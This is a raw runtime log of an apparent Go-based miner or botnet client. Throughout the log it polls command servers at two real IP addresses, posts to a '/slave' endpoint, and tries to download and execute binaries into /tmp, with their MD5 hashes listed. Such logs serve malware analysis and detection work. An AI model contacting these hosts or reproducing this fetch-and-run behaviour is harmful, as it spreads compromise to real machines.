+I0615 12:52:31.928344   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:31.930809   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:31.932585   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:31.938310   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:41.695464   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:52:41.695565   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:52:41.695600   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:52:41.695631   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:52:41.695665   17737 report.go:46] empty baselist
+I0615 12:52:42.152094   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:42.152170   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:42.154940   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:42.157853   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:42.160535   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:42.167063   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:42.169530   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.693393   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:52:51.693452   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:52:51.693477   17737 report.go:46] empty baselist
+I0615 12:52:51.921050   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:51.921708   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.924768   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.927419   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.929962   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.936512   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:51.939303   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.693099   17737 report.go:46] empty baselist
+I0615 12:53:01.736961   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:01.738122   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.740895   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.743044   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.745075   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.746746   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:01.748838   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.696258   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:53:11.696343   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:53:11.696383   17737 report.go:46] empty baselist
+I0615 12:53:11.835281   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:53:11.844992   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:53:11.913768   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:53:11.949402   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:11.949680   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.951323   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.952700   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.954082   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.955245   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.956508   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:11.971912   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:53:21.702022   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:53:21.702968   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:53:21.704001   17737 report.go:46] empty baselist
+I0615 12:53:21.752102   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:21.758042   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:21.760831   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:21.762765   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:21.764872   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:21.766835   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:21.769573   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.694055   17737 report.go:46] empty baselist
+I0615 12:53:31.735192   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:31.735306   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.738579   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.740748   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.742899   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.745701   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:31.747795   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.694664   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:53:41.694757   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:53:41.694797   17737 report.go:46] empty baselist
+I0615 12:53:41.918704   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:41.918795   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.921997   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.923525   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.925045   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.926505   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:41.928089   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.693606   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:53:51.693702   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:53:51.693742   17737 report.go:46] empty baselist
+I0615 12:53:51.936475   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:53:51.936565   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.940511   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.942468   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.944401   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.946765   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:53:51.955003   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.695623   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:54:01.695703   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:54:01.695735   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:54:01.695763   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:54:01.695797   17737 report.go:46] empty baselist
+I0615 12:54:01.920841   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:54:01.920918   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.923051   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.924727   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.926672   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.928397   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:01.930272   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.693874   17737 report.go:46] empty baselist
+I0615 12:54:11.733851   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:54:11.734255   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.738510   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.740972   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.742922   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.744661   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:11.746757   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.707266   17737 report.go:46] empty baselist
+I0615 12:54:21.746858   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:54:21.751356   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.759340   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.760910   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.763193   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.764804   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:21.766709   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.693895   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:54:31.693997   17737 main.go:33] pingpong: 103.219.112.66:8000
+I0615 12:54:31.694037   17737 report.go:46] empty baselist
+I0615 12:54:31.697450   17737 main.go:119] Post http://103.219.112.66:8000/slave: dial tcp 103.219.112.66:8000: connect: connection refused: 103.219.112.66:8000
+I0615 12:54:31.697534   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:54:31.697567   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:54:31.697599   17737 report.go:46] empty baselist
+I0615 12:54:31.921431   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:54:31.921508   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.923633   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.925197   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.927026   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.928350   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:31.929801   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:54:41.693263   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:54:41.693330   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:54:41.693352   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:54:41.693372   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:54:41.693396   17737 report.go:46] empty baselist
+I0615 12:55:41.693863   17737 main.go:119] Post http://67.207.95.103:8000/slave: net/http: request canceled (Client.Timeout exceeded while awaiting headers): 67.207.95.103:8000
+I0615 12:55:41.693951   17737 report.go:46] empty baselist
+I0615 12:55:41.769713   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:55:41.769784   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.771816   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.773443   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.774882   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.776379   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.778136   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.780391   17737 report.go:46] empty baselist
+I0615 12:55:41.815837   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:55:41.815908   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.817814   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.819360   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.820865   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.822352   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:41.823790   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.694408   17737 report.go:46] empty baselist
+I0615 12:55:51.730697   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:55:51.731264   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.733801   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.736040   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.738549   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.740659   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:55:51.742778   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.693429   17737 report.go:46] empty baselist
+I0615 12:56:01.737331   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:01.740259   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.743361   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.745776   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.747769   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.749788   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:01.751883   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.700452   17737 report.go:46] empty baselist
+I0615 12:56:11.742687   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:11.745792   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.753745   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.770679   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.776933   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.780156   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.781973   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:11.889923   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:56:11.903634   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:56:11.962677   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:56:12.024922   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:56:21.694489   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:56:21.694584   17737 main.go:113] skip 67.207.95.103:8000
+I0615 12:56:21.694701   17737 report.go:46] empty baselist
+I0615 12:56:21.733196   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:21.733881   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:21.736920   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:21.741249   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:21.743204   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:21.745362   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:21.747991   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.693289   17737 report.go:46] empty baselist
+I0615 12:56:31.730602   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:31.731264   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.734192   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.736268   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.738153   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.740014   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:31.741975   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.693480   17737 report.go:46] empty baselist
+I0615 12:56:41.743179   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:41.743830   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.746372   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.748558   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.750483   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.752586   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:41.754633   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.693932   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:56:51.694009   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:56:51.694099   17737 report.go:46] empty baselist
+I0615 12:56:51.730951   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:56:51.731286   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.735315   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.737036   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.738848   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.740599   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:56:51.742714   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.693321   17737 report.go:46] empty baselist
+I0615 12:57:01.732995   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:01.733369   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.738885   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.741054   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.744564   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.746332   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:01.748057   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.704795   17737 report.go:46] empty baselist
+I0615 12:57:11.778694   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:11.778793   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.782796   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.784893   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.786708   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.788498   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:11.791840   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.693109   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:57:21.693182   17737 main.go:113] skip 67.207.95.103:8000
+I0615 12:57:21.693206   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:57:21.693229   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:57:21.693299   17737 report.go:46] empty baselist
+I0615 12:57:21.736343   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:21.736823   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.739346   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.741483   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.743669   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.745491   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:21.748330   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:31.693314   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:57:31.693404   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:57:31.693436   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:57:31.693468   17737 main.go:113] skip 67.207.95.103:8000
+I0615 12:57:31.693560   17737 report.go:46] empty baselist
+I0615 12:57:31.731586   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:31.732297   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:31.735055   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
